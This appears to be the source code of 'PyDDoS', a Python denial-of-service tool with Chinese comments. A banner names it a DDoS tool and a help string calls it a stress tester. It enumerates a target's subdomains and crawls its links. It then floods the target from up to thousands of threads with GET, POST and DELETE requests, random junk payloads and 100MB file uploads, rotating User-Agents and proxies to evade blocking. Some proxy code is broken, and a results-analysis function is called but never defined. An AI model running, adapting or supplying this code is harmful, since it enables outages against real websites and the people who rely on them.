import argparse
import requests
import socks
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time
import random
import threading
import numpy as np
import matplotlib.pyplot as plt
from datetime import datetime
import psutil
import logging
from tqdm import tqdm
import sublist3r
import string
import signal
import sys

# 初始化日志记录
logging.basicConfig(filename='request_logs.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 捕捉 Ctrl+C 中断信号，确保安全退出
def signal_handler(sig, frame):
    global threads_running
    print('程序中断，正在安全退出...')
    threads_running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# 读取UA列表
def load_user_agents(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

# 生成随机乱码文本
def generate_garbled_text(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# 使用 Sublist3r 获取子域名
def get_subdomains(domain):
    subdomains = sublist3r.main(domain, 40, savefile=None, ports=None, silent=True, verbose=False, enable_bruteforce=False, engines=None)
    return subdomains

# 获取所有链接
def get_all_website_links(url, depth=0):
    if depth > max_depth:
        return set()
    print(f"正在访问: {url}，深度：{depth}")
    domain_name = urlparse(url).netloc
    urls = set()
    try:
        headers = random.choice(headers_list)
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()  # 确保请求成功
        soup = BeautifulSoup(response.text, "html.parser")

        for a_tag in soup.findAll("a"):
            href = a_tag.attrs.get("href")
            if href == "" or href is None:
                continue
            href = urljoin(url, href)
            parsed_href = urlparse(href)
            href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
            if domain_name in href and href not in visited_urls:
                urls.add(href)
    except requests.exceptions.RequestException as e:
        logging.error(f"请求错误 {e}")
    except Exception as e:
        logging.error(f"解析错误 {e}")

    visited_urls.update(urls)
    # 递归访问链接
    for link in urls:
        if link not in visited_urls:
            time.sleep(1)  # 设置延时，避免请求过于频繁
            get_all_website_links(link, depth + 1)
    return urls

# 生成大文件
def generate_large_binary_file(file_name, size_in_mb):
    with open(file_name, 'wb') as f:
        f.write(os.urandom(size_in_mb * 1024 * 1024))  # 生成随机的二进制数据

# 动态管理线程数
def dynamic_thread_management():
    cpu_usage = psutil.cpu_percent(interval=1)
    if cpu_usage > 80:
        return max(10, thread_count // 2)
    elif cpu_usage < 50:
        return min(2500, thread_count * 2)
    return thread_count

# 记录请求的详细信息
def log_request_details(result):
    logging.info(f"URL: {result['url']}, Method: {result['method']}, Status: {result['status_code']}, "
                 f"Response Time: {result['response_time']:.2f}s, Data Size: {result['data_size']} bytes")

# 显示当前网络流量
def net_speed():
    sent_before = psutil.net_io_counters().bytes_sent
    recv_before = psutil.net_io_counters().bytes_recv
    time.sleep(1)
    sent_now = psutil.net_io_counters().bytes_sent
    recv_now = psutil.net_io_counters().bytes_recv
    sent = (sent_now - sent_before) / 1024
    recv = (recv_now - recv_before) / 1024
    return sent, recv

# 使用 tqdm 显示测试进度和 Dashboard 信息
def update_progress(start_time, test_duration):
    global active_threads, requests_last_second, bytes_sent
    # with tqdm(total=test_duration, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{rate_fmt}]') as pbar:
    with tqdm(total=test_duration, desc='Progress', ncols=200) as pbar:
        while threads_running:
            elapsed_time = time.time() - start_time
            progress = elapsed_time / test_duration
            pbar.n = int(progress * test_duration)
            rate = bytes_sent / (elapsed_time * 1024 * 1024)  # 计算发送速率 (MB/s)
            pbar.set_postfix({
                'Active Threads': active_threads,
                'Requests/s': requests_last_second,
                'Upload': f"{rate:.2f}MB/s" if rate > 1 else f"{rate*1024:.2f}KB/s",
                'Total Requests': len(results)
            })
            pbar.update(0)
            time.sleep(1)

            with lock:
                requests_last_second = 0  # Reset after each second

# 检查域名是否可访问
def check_domain_accessibility(domain, max_retries):
    success = False
    for attempt in range(max_retries):
        try:
            response = requests.get(f"https://{domain}", timeout=5)
            if response.status_code == 200:
                print(f"域名 {domain} 可访问")
                success = True
                break
        except requests.exceptions.ConnectionError as e:
            print(f"尝试访问域名 {domain} 失败: {e}")
            if attempt < max_retries - 1:
                print(f"重试中... ({attempt + 1}/{max_retries})")
            else:
                print(f"最大重试次数已到达，域名 {domain} 不可访问")
        time.sleep(1)
    return success

# 处理大文件上传
def handle_large_files(file_count, file_size, regenerate_files):
    files_in_memory = []

    # 创建临时文件夹用于存储大文件
    temp_folder = "temp_files"
    if not os.path.exists(temp_folder):
        os.makedirs(temp_folder)

    if regenerate_files:
        # 每次都重新生成，文件不会被保存到文件夹
        for _ in range(file_count):
            file_data = os.urandom(file_size * 1024 * 1024)
            files_in_memory.append(file_data)
    else:
        # 如果选择只生成有限个文件，则存储在 temp_files 文件夹中
        for i in range(file_count):
            file_path = os.path.join(temp_folder, f"large_file_{i}.bin")
            if not os.path.exists(file_path):
                generate_large_binary_file(file_path, file_size)
            with open(file_path, 'rb') as f:
                files_in_memory.append(f.read())  # 将文件内容加载到内存
    return files_in_memory

# 代理检查函数
def check_proxy(proxy, proxy_type, timeout=3):
    try:
        s = socks.socksocket()
        s.settimeout(timeout)
        if proxy_type == 'SOCKS4':
            s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
        elif proxy_type == 'SOCKS5':
            s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
        elif proxy_type == 'HTTP':
            s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
        s.connect(('1.1.1.1', 80))  # 测试代理的可用性
        return True
    except Exception:
        return False

# 验证代理的线程处理
def validate_proxies_threaded(proxies, proxy_type, max_threads=10):
    valid_proxies = []
    lock = threading.Lock()

    def validate_proxy(proxy):
        nonlocal valid_proxies
        proxy = proxy.split(":")
        if check_proxy(proxy, proxy_type):
            with lock:
                valid_proxies.append(proxy)

    print("正在使用{}个线程并行验证代理...".format(max_threads))
    with tqdm(total=len(proxies)) as pbar:
        def thread_worker():
            while proxies_queue:
                proxy = proxies_queue.pop(0)
                validate_proxy(proxy)
                pbar.update(1)

        # 创建工作队列
        proxies_queue = proxies.copy()
        threads = []

        for _ in range(min(max_threads, len(proxies_queue))):
            t = threading.Thread(target=thread_worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    print(f"验证完成：{len(valid_proxies)} 个代理可用")
    if len(valid_proxies) == 0:
        sys.exit(0)
    if len(valid_proxies) < 10:
        print("warning: 可用代理过少")
    return valid_proxies

# 执行请求，检查冲突，并通过代理发送
def perform_requests(urls, headers_list, request_interval, methods, garbled_text_len, files_in_memory, proxies, proxy_type):
    global active_threads, requests_last_second, bytes_sent
    with lock:
        active_threads += 1
    try:
        while threads_running:
            url = random.choice(urls)
            headers = random.choice(headers_list)
            start_time = datetime.now()
            
            # 选择请求方法
            method = random.choice(methods)
            
            # 检查冲突：GET 不支持大文件上传
            if method == 'GET' and files_in_memory:
                logging.error(f"GET 请求不支持大文件上传，跳过该请求: {url}")
                continue

            # 数据内容：乱码或文件
            data = None
            if garbled_text_len:
                data = generate_garbled_text(garbled_text_len)
            elif files_in_memory:
                data = random.choice(files_in_memory)  # 随机选择一个文件或内容
            
            # 设置代理
            proxy = random.choice(proxies) if proxies else None
            if proxy:
                s = socks.socksocket()
                if proxy_type == 'SOCKS4':
                    s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
                elif proxy_type == 'SOCKS5':
                    s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                elif proxy_type == 'HTTP':
                    s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
                s.connect((url, 80))

            # 发送请求
            try:
                if method == 'GET':
                    response = requests.get(url, headers=headers, proxies=proxy, verify=False)
                elif method == 'POST':
                    if files_in_memory:
                        response = requests.post(url, headers=headers, files={'file': data}, verify=False)
                    else:
                        response = requests.post(url, headers=headers, data=data, verify=False)
                elif method == 'DELETE':
                    response = requests.delete(url, headers=headers, data=data, verify=False)
            except requests.exceptions.RequestException as e:
                logging.error(f"请求错误: {e}")
                continue

            # 请求完成，记录时间和数据大小
            if response:
                end_time = datetime.now()
                elapsed_time = (end_time - start_time).total_seconds()
                data_size = len(response.content)
                    
                with lock:
                    result = {
                        "timestamp": start_time,
                        "url": url,
                        "method": method,
                        "response_time": elapsed_time,
                        "status_code": response.status_code,
                        "data_size": data_size
                    }
                    results.append(result)
                    requests_last_second += 1
                    bytes_sent += data_size
                    log_request_details(result)

            time.sleep(request_interval)
    finally:
        with lock:
            active_threads -= 1

# 主程序逻辑
def main():

    print('''
    ____        ____  ____       _____
   / __ \__  __/ __ \/ __ \____ / ___/
  / /_/ / / / / / / / / / / __ \\__ \ 
 / ____/ /_/ / /_/ / /_/ / /_/ /__/ / 
/_/    \__, /_____/_____/\____/____/  
      /____/                          
>--------------------------------------------->
Version 3.7.1 (2024/9/22)
                              C0ded by Steven Chen
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+] Added Java Version             │
├─────────────────────────────────────────────┤
│ Link: https://github.com/StevenChen16/PyDDoS│
└─────────────────────────────────────────────┘
    ''')

    parser = argparse.ArgumentParser(description='Website Stress Testing Tool')
    parser.add_argument('--domain', type=str, required=True, help='The domain to test.')
    parser.add_argument('--duration', type=int, default=2400, help='Test duration in seconds.')
    parser.add_argument('--threads', type=int, default=1000, help='Number of threads.')
    parser.add_argument('--interval', type=float, default=0.1, help='Request interval in seconds.')
    parser.add_argument('--ua-file', type=str, default='user_agents.txt', help='Path to User-Agent list file.')
    parser.add_argument('--tolerance', type=int, default=5, help='Maximum retries for domain check.')
    parser.add_argument('--skip-check', action='store_true', help='Skip domain accessibility check.')
    parser.add_argument('--methods', nargs='+', default=['GET'], help='HTTP methods to use (GET, POST, DELETE).')
    parser.add_argument('--garbled-text-len', type=int, help='Length of random garbled text to send in requests.')
    parser.add_argument('--file-count', type=int, help='Number of large files to generate or load.')
    parser.add_argument('--file-size', type=int, default=100, help='Size of each file in MB.')
    parser.add_argument('--regenerate-files', action='store_true', help='Regenerate files instead of caching them.')
    parser.add_argument('--proxy-file', type=str, help='Path to proxy list file.')
    parser.add_argument('--proxy-type', type=str, default='SOCKS5', choices=['SOCKS4', 'SOCKS5', 'HTTP'], help='Type of proxies to use.')
    parser.add_argument('--proxy-threads', type=int, default=30, help='Number of threads for validating proxies.')
    parser.add_argument('--max-depth', type=int, default=2, help='Maximum depth for crawling links.')
    parser.add_argument('--recursive-link-search', action='store_true', help='Recursive link search')

    args = parser.parse_args()

    global threads_running, active_threads, requests_last_second, results, bytes_sent
    global thread_count, test_duration, request_interval, lock, max_depth, headers_list, visited_urls

    max_depth = args.max_depth
    visited_urls = set()

    # 检查域名是否可访问（若未跳过）
    if not args.skip_check:
        domain_accessible = check_domain_accessibility(args.domain, args.tolerance)
        if not domain_accessible:
            print(f"Warning: 域名 {args.domain} 访问失败，将继续进行压力测试。")

    # 加载 User-Agent 列表
    headers_list = [{"User-Agent": ua} for ua in load_user_agents(args.ua_file)]

    # 获取子域名和 URL
    subdomains = get_subdomains(args.domain)
    all_urls = {"https://" + args.domain} | {"https://" + sub for sub in subdomains}

    # 递归抓取链接
    if args.recursive_link_search:
        print(f"抓取 {args.domain} 的所有链接，深度为 {max_depth}")
        all_urls.update(get_all_website_links(f"https://{args.domain}"))

        print(f"Valid URLs found: {len(all_urls)}")
        urls = list(all_urls)
    else:
        urls = [f"https://{args.domain}"]

    # 处理大文件
    files_in_memory = []
    if args.file_count:
        files_in_memory = handle_large_files(args.file_count, args.file_size, args.regenerate_files)
        print(f"Generated or loaded {len(files_in_memory)} files.")

    # 加载代理列表并并行验证
    proxies = []
    if args.proxy_file:
        with open(args.proxy_file, 'r') as f:
            proxies = [line.strip() for line in f.readlines()]
        print(f"Loaded {len(proxies)} proxies from file.")
        proxies = validate_proxies_threaded(proxies, args.proxy_type, max_threads=args.proxy_threads)
        print(f"{len(proxies)} proxies validated and usable.")

    # 共享资源初始化
    threads_running = True
    lock = threading.Lock()
    results = []
    requests_last_second = 0
    active_threads = 0
    bytes_sent = 0

    start_time = time.time()

    # 启动进度条和 Dashboard 线程
    progress_thread = threading.Thread(target=update_progress, args=(start_time, args.duration))
    progress_thread.start()

    # 启动压力测试线程
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=perform_requests, args=(urls, headers_list, args.interval, args.methods, args.garbled_text_len, files_in_memory, proxies, args.proxy_type))
        t.start()
        threads.append(t)

    # 等待测试完成
    time.sleep(args.duration)
    threads_running = False

    # 等待所有线程结束
    for t in threads:
        t.join()

    # 分析并可视化结果
    analyze_results(urls)

    # 停止进度条线程
    progress_thread.join()

if __name__ == '__main__':
    main()
